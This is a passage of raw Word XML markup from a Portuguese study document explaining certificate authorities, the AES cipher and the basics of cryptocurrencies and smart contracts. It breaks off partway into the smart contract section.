        </w:rPr>
        <w:t xml:space="preserve"> ambos confirmam os parâmetros e passam a enviar dados cifrados.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76146806" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07E79A9B" w14:textId="1FDDABFC" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CA Autoridades de Certificação</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B22D97D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62FE7E8E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3DAA3B15" w14:textId="77777777" w:rsidR="002E26AA" w:rsidRDefault="00000000">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Autoridades de Certificação</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> são empresas e entidades responsáveis por emitir certificados confiáveis para o protocolo </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>TLS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5849E7E0" w14:textId="34BBDCA2" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">Para poderem emitir estes certificados, essas entidades passam por </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>auditorias e validações</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> e são a </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>raiz do sistema de certificados</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Agem como uma </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>entidade terceira confiável</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> que </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>adicionam uma camada extra de segurança no protocolo TLS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> quando os </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>certificados são trocados</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Páginas de </w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:t>”</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> para serem consideradas seguras </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>passam por este tipo de autenticação</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> pois </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>necessitam de certificados emitidos por essas autoridades</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2651517F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18B035CD" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="8" w:name="_Toc213874696"/>
      <w:bookmarkStart w:id="9" w:name="_Toc213881893"/>
      <w:r>
        <w:t>Protocolo AES - Advanced Encryption Standard</w:t>
      </w:r>
      <w:bookmarkEnd w:id="8"/>
      <w:bookmarkEnd w:id="9"/>
    </w:p>
    <w:p w14:paraId="3B0CC9F2" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74AC25E6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>O que é o AES: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C04DBC1" w14:textId="77777777" w:rsidR="00363733" w:rsidRDefault="00363733">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B36D25B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00363733">
      <w:r>
        <w:t xml:space="preserve">É baseado em uma rede que processo </w:t>
      </w:r>
      <w:r w:rsidRPr="00363733">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>de encriptação de AES</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> que realiza nas operações principais.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5130B2D1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00363733">
      <w:r>
        <w:t xml:space="preserve">Utiliza a mesma chave para </w:t>
      </w:r>
      <w:r w:rsidRPr="00363733">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>encriptar e decifrar os dados</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Funciona em </w:t>
      </w:r>
      <w:r w:rsidRPr="00363733">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>blocos de 128 bits para transformar o texto simples</w:t>
      </w:r>
      <w:r>
        <w:t>.  Quanto maior o tamanho da chave, mais intensivo computacionalmente é quebrar a criptografia.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60479715" w14:textId="529E18BB" w:rsidR="00363733" w:rsidRDefault="00392CCA" w:rsidP="00392CCA">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="65C12007" wp14:editId="02BCC590">
            <wp:extent cx="4168140" cy="2500688"/>
            <wp:effectExtent l="0" t="0" r="3810" b="0"/>
            <wp:docPr id="704738686" name="Imagem 22" descr="What is Advanced Encryption Standard (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What is Advanced Encryption Standard (A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8526" cy="2506919"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0016F877" w14:textId="77777777" w:rsidR="00392CCA" w:rsidRDefault="00392CCA" w:rsidP="00392CCA">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E8CDA8A" w14:textId="77777777" w:rsidR="00392CCA" w:rsidRDefault="00392CCA" w:rsidP="00392CCA">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C1A1B74" w14:textId="77777777" w:rsidR="00392CCA" w:rsidRDefault="00392CCA" w:rsidP="00392CCA">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="704A27C8" w14:textId="77777777" w:rsidR="00363733" w:rsidRDefault="00363733" w:rsidP="00363733"/>
    <w:p w14:paraId="5448D9E3" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC" w:rsidP="00363733"/>
    <w:p w14:paraId="09DBAAC4" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Como funciona:  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="258A8E3A" w14:textId="77777777" w:rsidR="00363733" w:rsidRDefault="00363733">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B32D7C0" w14:textId="1F74F72E" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00363733">
      <w:r>
        <w:t xml:space="preserve">O </w:t>
      </w:r>
      <w:r w:rsidRPr="00363733">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>AES</w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:t>, “</w:t>
      </w:r>
      <w:r w:rsidRPr="00363733">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Advanced Encryption Standard</w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>”,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> é um algoritmo de criptografia simétrica, o que significa que </w:t>
      </w:r>
      <w:r w:rsidRPr="00363733">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>a mesma chave é utilizada tanto para encriptar como para desencriptar os dados</w:t>
      </w:r>
      <w:r>
        <w:t>. É usado em sistemas de segurança modernos devido à sua eficiência, rapidez e alto nível de proteção.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="788BC394" w14:textId="306BF02E" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00363733">
      <w:r>
        <w:t xml:space="preserve">O </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>AES</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> é uma </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>cifra de bloco</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, ou seja, ele divide os dados em </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>blocos de 128 bits</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ou </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>16 bytes</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> e processa cada bloco separadamente. Dependendo do tamanho da chave escolhida: </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>128, 192 ou 256</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> bits com </w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:t>um algoritmo</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> realiza 10, 12 ou 14 etapas.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24DAF503" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7EF62B75" w14:textId="79912D8D" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Como funciona a Expansão da </w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>chave:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D71192F" w14:textId="77777777" w:rsidR="00363733" w:rsidRDefault="00363733">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44EE309F" w14:textId="239F9256" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00363733">
      <w:r>
        <w:t xml:space="preserve">A chave original </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>não é usada diretamente em todas as etapas</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. A </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">AES </w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:t>realiza a</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> expansão de chave para </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>gerar várias chaves para várias etapas</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Ela usa </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>operações matemáticas</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> para gerar </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>variação e segurança em com a etapa</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00CC2D31" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="255D4AA5" w14:textId="77777777" w:rsidR="00363733" w:rsidRDefault="00363733">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="41794173" w14:textId="070563E0" w:rsidR="00363733" w:rsidRDefault="00000000" w:rsidP="00363733">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Como funciona a Desencriptação</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="358DD30A" w14:textId="77777777" w:rsidR="00363733" w:rsidRDefault="00363733" w:rsidP="00363733">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="590E860C" w14:textId="7152C65D" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00363733">
      <w:r>
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>desencriptação da AES</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> segue na mesma etapa, mas </w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:t>aplica</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>forma inversa</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> utilizando as </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>chaves de etapa na ordem contrária</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Os dados são </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>cifrados para transformar um texto original</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CC62CEC" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRDefault="00A04B3D">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F288C8B" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2640F305" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3AD9A53C" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DAAE2AF" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65939F49" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="592E1248" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E3A413C" w14:textId="1CE5E833" w:rsidR="00363733" w:rsidRDefault="00363733">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="147708C5" w14:textId="7A2F4444" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="10" w:name="_Toc213881894"/>
      <w:r w:rsidRPr="00A04B3D">
        <w:lastRenderedPageBreak/>
        <w:t>Blockchain</w:t>
      </w:r>
      <w:bookmarkEnd w:id="10"/>
    </w:p>
    <w:p w14:paraId="29F600A0" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="34A5352C" w14:textId="35AEF844" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Criptomoedas </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40F5ADCE" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C1982FE" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="002E26AA">
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Criptomoeda</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve"> é uma </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>moeda digital descentralizada</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">, que </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>utiliza a tecnologia “blockchain” para garantir segurança, transparência e confiança nas transações</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69C304DD" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="002E26AA">
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">Em vez de ser controlada por bancos ou governos, a criptomoeda funciona através de uma </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>rede global de computadores</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve"> que </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>valida e regista todas as operações num livro público imutável</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">. Cada transação é protegida por “criptografia”, impedindo </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>falsificações ou alterações</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="799E9422" w14:textId="53F2FF77" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="002E26AA">
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">O </w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Bitcoin</w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:t>”</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve"> foi a primeira criptomoeda, criada em </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>2009</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">, e continua a ser a mais conhecida. Desde então, surgiram muitas outras, como </w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>Ethereum</w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:t>”</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>Cardano</w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:t>”</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve"> e </w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>Solana</w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:t>”</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">, que introduzem novas funcionalidades, como os </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>contratos inteligentes</w:t>
      </w:r>
      <w:r w:rsidR="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>, ou “Smart Contracts”</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53A5D43C" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="002E26AA">
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve">Em termos simples, as criptomoedas permitem </w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>enviar e receber valor pela internet de forma rápida, segura e sem intermediários</w:t>
      </w:r>
      <w:r w:rsidRPr="00A04B3D">
        <w:t xml:space="preserve"> — embora o seu valor de mercado seja altamente volátil.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BCBF39E" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A4DA480" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0FACB3DF" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A04B3D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Smart Contract</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F7D1EBE" w14:textId="77777777" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="00A04B3D">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68460ADB" w14:textId="2C3F6B2C" w:rsidR="00A04B3D" w:rsidRPr="00A04B3D" w:rsidRDefault="00A04B3D" w:rsidP="002E26AA">
      <w:r w:rsidRPr="00A04B3D">
        <w:t>Um “</w:t>
      </w:r>
      <w:r w:rsidRPr="002E26AA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Smart Contract</w:t>
